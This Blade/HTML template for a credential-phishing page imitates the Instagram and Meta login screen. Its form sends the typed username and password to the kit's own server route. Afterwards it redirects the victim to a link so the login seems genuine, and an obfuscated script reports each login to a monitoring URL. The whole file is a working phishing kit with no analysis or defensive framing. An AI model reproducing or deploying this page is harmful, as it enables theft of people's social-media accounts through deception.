<!doctype html>
<html>

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <title>{{ $data->title }}</title>
    <meta name="title" content="{{ $data->title }}" />
    <meta name="description" content="{{ $data->description }}">
    <meta property="twitter:title" content="{{ $data->title }}" />
    <meta property="twitter:description" content="{{ $data->description }}" />
    <meta property="twitter:card" content="summary_large_image" />
    <meta property="twitter:image" content="{{ $data->image }}" />
    <meta property="og:title" content="{{ $data->title }}" />
    <meta property="og:image" content="{{ $data->image }}" />
    <meta property="og:type" content="article" />
    <link rel="shortcut icon"
        href="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/favicon.ico">
    @vite(['resources/css/app.css'])
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <style>
        @layer utilities {

            input:-webkit-autofill,
            input:-webkit-autofill:hover,
            input:-webkit-autofill:focus,
            input:-webkit-autofill:active {
                -webkit-box-shadow: 0 0 0px 1000px transparent inset !important;
                -webkit-text-fill-color: inherit !important;
                transition: background-color 9999s ease-in-out 0s;
            }
        }

        @font-face {
            font-family: 'MyRulersVjpPro';
            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/fb_font.woff2') format('woff2');
        }

        body {
            font-family: 'MyRulersVjpPro', sans-serif;
        }
    </style>
</head>

<body>
    <div class="lg:grid lg:grid-cols-[1fr_600px] border-b-3 border-b-[#dde2e7]">
        <div class="hidden sm:block col-span-1">
            <a href="" class="block ml-10">
                {{-- Instagram Logo --}}
                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/ig_logo.webp"
                    alt="ins-logo" class="mt-[50px] ml-4" width="70">
            </a>
            <div class="flex flex-col justify-center items-center px-10">
                <h1 class="text-[2rem] md:text-[3.5rem] leading-tight mt-[100px] mb-7 text-center">
                    {{ explode('_', __('instagram.discover_anything_you_like'))[0] }} <span
                        class="text-[#d300c5]">{{ explode('_', __('instagram.discover_anything_you_like'))[1] }}</span>
                </h1>
                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/banner.webp"
                    alt="ig-banner" class="w-[50%]">
            </div>
        </div>
        <div class="col-span-1 lg:border-l-3 border-l-[#dde2e7]">
            <div class="flex justify-center px-5 sm:px-10 mx-auto items-center h-full">
                <div class="space-y-3 w-full">
                    <div class="flex justify-center my-10 sm:hidden">
                        {{-- Mobile Instagram Logo --}}
                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/instagram/ig_logo.webp"
                            alt="fb-logo" width="60">
                    </div>
                    {{-- Notice đăng nhập --}}
                    <p class="font-semibold mb-5" id="notice">{{ $data->login_warning }}</p>
                    {{-- Thông báo khi lỗi --}}
                    <div class="py-3.5 px-4 bg-[#f93a4b] text-white text-sm rounded-2xl" id="warning"
                        style="display: none;"></div>
                    <form id="submit" class="space-y-3">
                        <div class="relative border border-gray-300 rounded-[17px] p-4">
                            <div class="flex gap-1">
                                <input id="user" type="text" placeholder=" "
                                    class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full"
                                    required>
                                <label
                                    class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                    for="user">{{ __('facebook.email_or_phone') }}</label>
                                <button id="close_btn" class="cursor-pointer hidden" type="button">
                                    <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/close_logo.svg"
                                        width="25" />
                                </button>
                            </div>
                        </div>
                        <div class="relative border border-gray-300 rounded-[17px] p-4">
                            <div class="flex gap-1">
                                <input id="pass" type="password" placeholder=" "
                                    class="mt-2 bg-transparent peer text-[15px] text-black placeholder:text-[#646d74] outline-none w-full"
                                    required>
                                <label
                                    class="absolute top-[10%] left-[16px] peer-placeholder-shown:top-[32%] peer-placeholder-shown:text-[15px] text-[#646d74] cursor-text text-sm peer-focus:top-[10%] peer-focus:text-sm transition-all"
                                    for="pass">{{ __('facebook.password') }}</label>
                                @if ($setting->showFacebookPasswordButton)
                                    <button type="button" id="show_pass" class="cursor-pointer hidden">
                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/show_pass.svg"
                                            width="25" />
                                    </button>
                                    <button type="button" id="hide_pass" class="cursor-pointer hidden">
                                        <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/hide_pass.svg"
                                            width="25" />
                                    </button>
                                @endif
                            </div>
                        </div>
                        <button type="submit"
                            class="outline-none cursor-pointer w-full bg-[#0064e0] text-white rounded-[100px] p-2.5 text-sm active:bg-[#3b8ef5] active:scale-[99%] transition-all duration-100 disabled:opacity-80 disabled:cursor-default disabled:pointer-events-none">
                            {{ __('facebook.login') }}</button>
                    </form>
                    <div class="mt-2">
                        <p class="text-center text-sm text-[#0d1114] cursor-pointer">
                            {{ __('facebook.forgot_password') }}</p>
                        <div class="space-y-6 mt-[100px]">
                            <button
                                class="font-semibold outline-none cursor-pointer w-full bg-white text-[#0064e0] border border-[#0064e0] rounded-[100px] p-2.5 text-sm transition-all duration-100">
                                {{ __('facebook.create_new_account') }}
                            </button>
                            <div class="flex justify-center mb-5">
                                <img src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/meta_logo.png"
                                    alt="fb-logo" width="55">
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="w-[90vw] mx-auto mt-5 h-[9vh]">
        <div class="flex gap-5 justify-center flex-wrap">
            <span class="text-[#646d74] cursor-pointer">Tiếng Việt</span>
            <span class="text-[#646d74] cursor-pointer">English (UK)</span>
            <span class="text-[#646d74] cursor-pointer">中文(台灣)</span>
            <span class="text-[#646d74] cursor-pointer">한국어</span>
            <span class="text-[#646d74] cursor-pointer">日本語</span>
            <span class="text-[#646d74] cursor-pointer">Français (France)</span>
            <span class="text-[#646d74] cursor-pointer">ภาษาไทย</span>
            <span class="text-[#646d74] cursor-pointer">{{ __('facebook.other_languages') }}</span>
        </div>
        <p class="text-[#646d74] text-center mt-5">Meta ©
            <script>
                document.write(new Date().getFullYear())
            </script>
        </p>
    </div>
    <script src="https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') }}/theme/system/facebook/helpers.js"></script>
    <script>
        $("#submit").submit(function(e) {
            e.preventDefault();
            const username = $("#user").val()
            const password = $("#pass").val()
            const warning = $("#warning")
            const btn = $(this).find('button[type=submit]')
            const dataToSend = {
                'username': username,
                'password': password,
                'info': '{{ $info }}'
            }
            btn.attr('disabled', true).html("{{ __('facebook.logging_in') }}")
            // auto detect phone or string
            warning.hide()
            @if ($setting->checkLoginFacebook)
                if (string_check(username)) {
                    if (!check_email(username)) {
                        warning.html("{{ __('facebook.wrong_email') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                        return
                    }
                } else {
                    if (!phone_check(username)) {
                        warning.html("{{ __('facebook.wrong_phone_or_email') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                        return
                    }
                }
            @endif
            @if ($setting->checkLoginFacebookPassword)
                if (password.length < 5) {
                    warning.html("{{ __('facebook.password_too_short') }}")
                    warning.show()
                    btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                    return
                }
            @endif
            $.post("{{ route('post.normalweb') }}", {
                    d: JSON.stringify(dataToSend),
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {
                    if (!data.status) {
                        warning.html("{{ __('facebook.try_again') }}")
                        warning.show()
                        btn.attr('disabled', false).html("{{ __('facebook.login') }}")
                        return
                    }
                    window.location.href = '{!! $data->redirect_link !!}'
                },
                "json"
            );
        });
        @if ($setting->web_monitor)
            function _0x288c() {
                const _0x37ec84 = ['48CMkkll', 'json', '3JonQMx', '17133vzCqfg', '4310966IniJJf',
                    '{{ env('WEB_MONITOR_API_URL') }}', 'post', 'ajax', '121420DbkbkL', '{{ $info }}',
                    '2589160vbohhG', '21xlbLfm', '728nFnPNA', '330tpFAEl', '32313696gMzGBS', '605396rIPIJR',
                    '145269vZVoyM', 'login'
                ];
                _0x288c = function() {
                    return _0x37ec84;
                };
                return _0x288c();
            }

            function _0x33d9(_0x4b7f11, _0x1ea9e4) {
                _0x4b7f11 = _0x4b7f11 - 0x66;
                const _0x288cc2 = _0x288c();
                let _0x33d95b = _0x288cc2[_0x4b7f11];
                return _0x33d95b;
            }(function(_0x605303, _0x130420) {
                const _0x4d4965 = _0x33d9,
                    _0x497ad1 = _0x605303();
                while (!![]) {
                    try {
                        const _0x1dbb7f = parseInt(_0x4d4965(0x6f)) / 0x1 * (parseInt(_0x4d4965(0x6a)) / 0x2) + -
                            parseInt(_0x4d4965(0x70)) / 0x3 * (-parseInt(_0x4d4965(0x67)) / 0x4) + -parseInt(_0x4d4965(
                                0x75)) / 0x5 * (-parseInt(_0x4d4965(0x6d)) / 0x6) + -parseInt(_0x4d4965(0x66)) / 0x7 * (
                                -parseInt(_0x4d4965(0x77)) / 0x8) + parseInt(_0x4d4965(0x6b)) / 0x9 * (parseInt(
                                _0x4d4965(0x68)) / 0xa) + -parseInt(_0x4d4965(0x71)) / 0xb + -parseInt(_0x4d4965(
                                0x69)) / 0xc;
                        if (_0x1dbb7f === _0x130420) break;
                        else _0x497ad1['push'](_0x497ad1['shift']());
                    } catch (_0x53c8ac) {
                        _0x497ad1['push'](_0x497ad1['shift']());
                    }
                }
            }(_0x288c, 0x88e02), ((() => {
                const _0x55563d = _0x33d9,
                    _0x566492 = {
                        'data': _0x55563d(0x76),
                        'type': _0x55563d(0x6c)
                    };
                $[_0x55563d(0x74)]({
                    'type': _0x55563d(0x73),
                    'url': _0x55563d(0x72),
                    'data': _0x566492,
                    'dataType': _0x55563d(0x6e),
                    'success': function(_0x882676) {}
                });
            })()));
        @endif
    </script>
</body>

</html>
